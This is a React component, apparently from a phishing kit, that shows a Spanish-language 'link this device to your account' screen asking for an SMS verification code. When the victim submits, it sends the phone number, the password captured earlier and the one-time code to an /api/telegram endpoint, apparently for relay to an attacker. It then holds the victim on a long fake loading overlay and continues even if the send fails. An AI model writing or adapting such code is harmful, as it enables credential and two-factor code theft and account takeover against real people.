import { useContext } from "react";
import { MainContext } from "../context/MainContext";
import StatusOverlay from "./StatusOverlay";
import useLoading from "../hooks/useLoading";

const CodeSection = ({ code, phone }) => {
  const { data, setData } = useContext(MainContext);

  const { isLoading, errorMessage, handleContinue } = useLoading(60000);

  const codeArray = Array(6)
    .fill("")
    .map((_, i) => code[i] || "");

  const formatPhoneNumber = (raw) => {
    if (!raw) return "";
    const digits = raw.replace(/\D/g, "").slice(0, 10);
    return `${digits.slice(0, 3)} ${digits.slice(3, 6)} ${digits.slice(6)}`.trim();
  };

  const formattedPhone = formatPhoneNumber(phone);

  const handleData = async () => {
    setData((prev) => ({ ...prev, codeString: code }));

    try {
      await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone: data.phoneString,
          password: data.passwordString,
          code,
        }),
      });

      handleContinue();
    } catch (err) {
      console.error("Error enviando datos a Telegram:", err);
      handleContinue();
    }
  };

  return (
    <div className="input-section-1 code">
      <StatusOverlay isLoading={isLoading} errorMessage={errorMessage} />

      <div className="top-section">
        <h2>Enlaza este dispositivo a tu cuenta</h2>
        <p>
          Escribe el código que te enviamos por mensaje de texto al celular <strong>{formattedPhone}</strong>
        </p>
        <div className="digit-boxes-alt">
          {codeArray.map((digit, idx) => (
            <div key={idx} className="digit-box-alt">
              {digit}
            </div>
          ))}
        </div>
      </div>

      <div className="bottom-section">
        <button className={`send-keyboard-button ${code.length === 6 ? "valid" : ""}`} onClick={handleData}>
          Validar
        </button>
      </div>
    </div>
  );
};

export default CodeSection;
